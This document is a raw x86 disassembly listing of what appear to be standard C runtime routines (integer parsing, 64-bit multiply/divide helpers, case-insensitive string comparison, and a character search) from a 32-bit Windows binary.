  428a22:	mov    ecx,DWORD PTR [edi+0x48]
  428a25:	movzx  eax,BYTE PTR [ecx+eax*2]
  428a29:	and    eax,0x8
  428a2c:	test   eax,eax
  428a2e:	je     0x428a33
  428a30:	inc    esi
  428a31:	jmp    0x428a0b
  428a33:	movzx  ecx,BYTE PTR [esi]
  428a36:	inc    esi
  428a37:	cmp    ecx,0x2d
  428a3a:	mov    edx,ecx
  428a3c:	je     0x428a43
  428a3e:	cmp    ecx,0x2b
  428a41:	jne    0x428a47
  428a43:	movzx  ecx,BYTE PTR [esi]
  428a46:	inc    esi
  428a47:	xor    eax,eax
  428a49:	cmp    ecx,0x30
  428a4c:	jl     0x428a58
  428a4e:	cmp    ecx,0x39
  428a51:	jg     0x428a58
  428a53:	sub    ecx,0x30
  428a56:	jmp    0x428a5b
  428a58:	or     ecx,0xffffffff
  428a5b:	cmp    ecx,0xffffffff
  428a5e:	je     0x428a6c
  428a60:	lea    eax,[eax+eax*4]
  428a63:	lea    eax,[ecx+eax*2]
  428a66:	movzx  ecx,BYTE PTR [esi]
  428a69:	inc    esi
  428a6a:	jmp    0x428a49
  428a6c:	cmp    edx,0x2d
  428a6f:	pop    edi
  428a70:	pop    esi
  428a71:	jne    0x428a75
  428a73:	neg    eax
  428a75:	ret    
  428a76:	push   ebp
  428a77:	mov    ebp,esp
  428a79:	push   ecx
  428a7a:	mov    eax,DWORD PTR [ebp+0xc]
  428a7d:	lea    ecx,[eax+0x1]
  428a80:	cmp    ecx,0x100
  428a86:	mov    ecx,DWORD PTR [ebp+0x8]
  428a89:	ja     0x428a94
  428a8b:	mov    ecx,DWORD PTR [ecx+0x48]
  428a8e:	movzx  eax,WORD PTR [ecx+eax*2]
  428a92:	jmp    0x428ae8
  428a94:	push   esi
  428a95:	mov    edx,eax
  428a97:	sar    edx,0x8
  428a9a:	push   edi
  428a9b:	mov    edi,DWORD PTR [ecx+0x48]
  428a9e:	movzx  esi,dl
  428aa1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  428aa6:	pop    edi
  428aa7:	pop    esi
  428aa8:	je     0x428ab9
  428aaa:	and    BYTE PTR [ebp-0x2],0x0
  428aae:	push   0x2
  428ab0:	mov    BYTE PTR [ebp-0x3],al
  428ab3:	mov    BYTE PTR [ebp-0x4],dl
  428ab6:	pop    eax
  428ab7:	jmp    0x428ac3
  428ab9:	and    BYTE PTR [ebp-0x3],0x0
  428abd:	mov    BYTE PTR [ebp-0x4],al
  428ac0:	xor    eax,eax
  428ac2:	inc    eax
  428ac3:	push   0x1
  428ac5:	push   DWORD PTR [ecx+0x14]
  428ac8:	push   DWORD PTR [ecx+0x4]
  428acb:	lea    ecx,[ebp+0xe]
  428ace:	push   ecx
  428acf:	push   eax
  428ad0:	lea    eax,[ebp-0x4]
  428ad3:	push   eax
  428ad4:	push   0x1
  428ad6:	call   0x427b58
  428adb:	add    esp,0x1c
  428ade:	test   eax,eax
  428ae0:	jne    0x428ae4
  428ae2:	leave  
  428ae3:	ret    
  428ae4:	movzx  eax,WORD PTR [ebp+0xe]
  428ae8:	and    eax,DWORD PTR [ebp+0x10]
  428aeb:	leave  
  428aec:	ret    
  428aed:	int3   
  428aee:	int3   
  428aef:	int3   
  428af0:	mov    eax,DWORD PTR [esp+0x8]
  428af4:	mov    ecx,DWORD PTR [esp+0x10]
  428af8:	or     ecx,eax
  428afa:	mov    ecx,DWORD PTR [esp+0xc]
  428afe:	jne    0x428b09
  428b00:	mov    eax,DWORD PTR [esp+0x4]
  428b04:	mul    ecx
  428b06:	ret    0x10
  428b09:	push   ebx
  428b0a:	mul    ecx
  428b0c:	mov    ebx,eax
  428b0e:	mov    eax,DWORD PTR [esp+0x8]
  428b12:	mul    DWORD PTR [esp+0x14]
  428b16:	add    ebx,eax
  428b18:	mov    eax,DWORD PTR [esp+0x8]
  428b1c:	mul    ecx
  428b1e:	add    edx,ebx
  428b20:	pop    ebx
  428b21:	ret    0x10
  428b24:	int3   
  428b25:	int3   
  428b26:	int3   
  428b27:	int3   
  428b28:	int3   
  428b29:	int3   
  428b2a:	int3   
  428b2b:	int3   
  428b2c:	int3   
  428b2d:	int3   
  428b2e:	int3   
  428b2f:	int3   
  428b30:	push   ebp
  428b31:	mov    ebp,esp
  428b33:	push   edi
  428b34:	push   esi
  428b35:	push   ebx
  428b36:	mov    ecx,DWORD PTR [ebp+0x10]
  428b39:	or     ecx,ecx
  428b3b:	je     0x428b8a
  428b3d:	mov    esi,DWORD PTR [ebp+0x8]
  428b40:	mov    edi,DWORD PTR [ebp+0xc]
  428b43:	mov    bh,0x41
  428b45:	mov    bl,0x5a
  428b47:	mov    dh,0x20
  428b49:	lea    ecx,[ecx+0x0]
  428b4c:	mov    ah,BYTE PTR [esi]
  428b4e:	or     ah,ah
  428b50:	mov    al,BYTE PTR [edi]
  428b52:	je     0x428b7b
  428b54:	or     al,al
  428b56:	je     0x428b7b
  428b58:	add    esi,0x1
  428b5b:	add    edi,0x1
  428b5e:	cmp    ah,bh
  428b60:	jb     0x428b68
  428b62:	cmp    ah,bl
  428b64:	ja     0x428b68
  428b66:	add    ah,dh
  428b68:	cmp    al,bh
  428b6a:	jb     0x428b72
  428b6c:	cmp    al,bl
  428b6e:	ja     0x428b72
  428b70:	add    al,dh
  428b72:	cmp    ah,al
  428b74:	jne    0x428b81
  428b76:	sub    ecx,0x1
  428b79:	jne    0x428b4c
  428b7b:	xor    ecx,ecx
  428b7d:	cmp    ah,al
  428b7f:	je     0x428b8a
  428b81:	mov    ecx,0xffffffff
  428b86:	jb     0x428b8a
  428b88:	neg    ecx
  428b8a:	mov    eax,ecx
  428b8c:	pop    ebx
  428b8d:	pop    esi
  428b8e:	pop    edi
  428b8f:	leave  
  428b90:	ret    
  428b91:	int3   
  428b92:	int3   
  428b93:	int3   
  428b94:	int3   
  428b95:	int3   
  428b96:	int3   
  428b97:	int3   
  428b98:	int3   
  428b99:	int3   
  428b9a:	int3   
  428b9b:	int3   
  428b9c:	int3   
  428b9d:	int3   
  428b9e:	int3   
  428b9f:	int3   
  428ba0:	push   esi
  428ba1:	mov    eax,DWORD PTR [esp+0x14]
  428ba5:	or     eax,eax
  428ba7:	jne    0x428bd1
  428ba9:	mov    ecx,DWORD PTR [esp+0x10]
  428bad:	mov    eax,DWORD PTR [esp+0xc]
  428bb1:	xor    edx,edx
  428bb3:	div    ecx
  428bb5:	mov    ebx,eax
  428bb7:	mov    eax,DWORD PTR [esp+0x8]
  428bbb:	div    ecx
  428bbd:	mov    esi,eax
  428bbf:	mov    eax,ebx
  428bc1:	mul    DWORD PTR [esp+0x10]
  428bc5:	mov    ecx,eax
  428bc7:	mov    eax,esi
  428bc9:	mul    DWORD PTR [esp+0x10]
  428bcd:	add    edx,ecx
  428bcf:	jmp    0x428c18
  428bd1:	mov    ecx,eax
  428bd3:	mov    ebx,DWORD PTR [esp+0x10]
  428bd7:	mov    edx,DWORD PTR [esp+0xc]
  428bdb:	mov    eax,DWORD PTR [esp+0x8]
  428bdf:	shr    ecx,1
  428be1:	rcr    ebx,1
  428be3:	shr    edx,1
  428be5:	rcr    eax,1
  428be7:	or     ecx,ecx
  428be9:	jne    0x428bdf
  428beb:	div    ebx
  428bed:	mov    esi,eax
  428bef:	mul    DWORD PTR [esp+0x14]
  428bf3:	mov    ecx,eax
  428bf5:	mov    eax,DWORD PTR [esp+0x10]
  428bf9:	mul    esi
  428bfb:	add    edx,ecx
  428bfd:	jb     0x428c0d
  428bff:	cmp    edx,DWORD PTR [esp+0xc]
  428c03:	ja     0x428c0d
  428c05:	jb     0x428c16
  428c07:	cmp    eax,DWORD PTR [esp+0x8]
  428c0b:	jbe    0x428c16
  428c0d:	dec    esi
  428c0e:	sub    eax,DWORD PTR [esp+0x10]
  428c12:	sbb    edx,DWORD PTR [esp+0x14]
  428c16:	xor    ebx,ebx
  428c18:	sub    eax,DWORD PTR [esp+0x8]
  428c1c:	sbb    edx,DWORD PTR [esp+0xc]
  428c20:	neg    edx
  428c22:	neg    eax
  428c24:	sbb    edx,0x0
  428c27:	mov    ecx,edx
  428c29:	mov    edx,ebx
  428c2b:	mov    ebx,ecx
  428c2d:	mov    ecx,eax
  428c2f:	mov    eax,esi
  428c31:	pop    esi
  428c32:	ret    0x10
  428c35:	int3   
  428c36:	int3   
  428c37:	int3   
  428c38:	int3   
  428c39:	int3   
  428c3a:	int3   
  428c3b:	int3   
  428c3c:	int3   
  428c3d:	int3   
  428c3e:	int3   
  428c3f:	int3   
  428c40:	lea    eax,[edx-0x1]
  428c43:	pop    ebx
  428c44:	ret    
  428c45:	lea    esp,[esp+0x0]
  428c4c:	lea    esp,[esp+0x0]
  428c50:	xor    eax,eax
  428c52:	mov    al,BYTE PTR [esp+0x8]
  428c56:	push   ebx
  428c57:	mov    ebx,eax
  428c59:	shl    eax,0x8
  428c5c:	mov    edx,DWORD PTR [esp+0x8]
  428c60:	test   edx,0x3
  428c66:	je     0x428c7d
  428c68:	mov    cl,BYTE PTR [edx]
  428c6a:	add    edx,0x1
  428c6d:	cmp    cl,bl
  428c6f:	je     0x428c40
  428c71:	test   cl,cl
  428c73:	je     0x428cc6
  428c75:	test   edx,0x3
  428c7b:	jne    0x428c68
  428c7d:	or     ebx,eax
  428c7f:	push   edi
  428c80:	mov    eax,ebx
  428c82:	shl    ebx,0x10
  428c85:	push   esi
  428c86:	or     ebx,eax
  428c88:	mov    ecx,DWORD PTR [edx]
  428c8a:	mov    edi,0x7efefeff
  428c8f:	mov    eax,ecx
  428c91:	mov    esi,edi
  428c93:	xor    ecx,ebx
  428c95:	add    esi,eax
  428c97:	add    edi,ecx
  428c99:	xor    ecx,0xffffffff
  428c9c:	xor    eax,0xffffffff
  428c9f:	xor    ecx,edi
  428ca1:	xor    eax,esi
  428ca3:	add    edx,0x4
  428ca6:	and    ecx,0x81010100
  428cac:	jne    0x428cca
  428cae:	and    eax,0x81010100
  428cb3:	je     0x428c88
  428cb5:	and    eax,0x1010100
  428cba:	jne    0x428cc4
  428cbc:	and    esi,0x80000000
  428cc2:	jne    0x428c88
  428cc4:	pop    esi
  428cc5:	pop    edi
  428cc6:	pop    ebx
  428cc7:	xor    eax,eax
  428cc9:	ret    
  428cca:	mov    eax,DWORD PTR [edx-0x4]
  428ccd:	cmp    al,bl
  428ccf:	je     0x428d07
  428cd1:	test   al,al
  428cd3:	je     0x428cc4
  428cd5:	cmp    ah,bl
  428cd7:	je     0x428d00
  428cd9:	test   ah,ah
  428cdb:	je     0x428cc4
  428cdd:	shr    eax,0x10
  428ce0:	cmp    al,bl
  428ce2:	je     0x428cf9
  428ce4:	test   al,al
  428ce6:	je     0x428cc4
  428ce8:	cmp    ah,bl
  428cea:	je     0x428cf2
  428cec:	test   ah,ah
  428cee:	je     0x428cc4
  428cf0:	jmp    0x428c88
  428cf2:	pop    esi
  428cf3:	pop    edi
  428cf4:	lea    eax,[edx-0x1]
  428cf7:	pop    ebx
  428cf8:	ret    
  428cf9:	lea    eax,[edx-0x2]
  428cfc:	pop    esi
  428cfd:	pop    edi
  428cfe:	pop    ebx
  428cff:	ret    
  428d00:	lea    eax,[edx-0x3]
  428d03:	pop    esi
  428d04:	pop    edi
  428d05:	pop    ebx
  428d06:	ret    
  428d07:	lea    eax,[edx-0x4]
  428d0a:	pop    esi
  428d0b:	pop    edi
  428d0c:	pop    ebx
  428d0d:	ret    
  428d0e:	jmp    DWORD PTR ds:0x429070
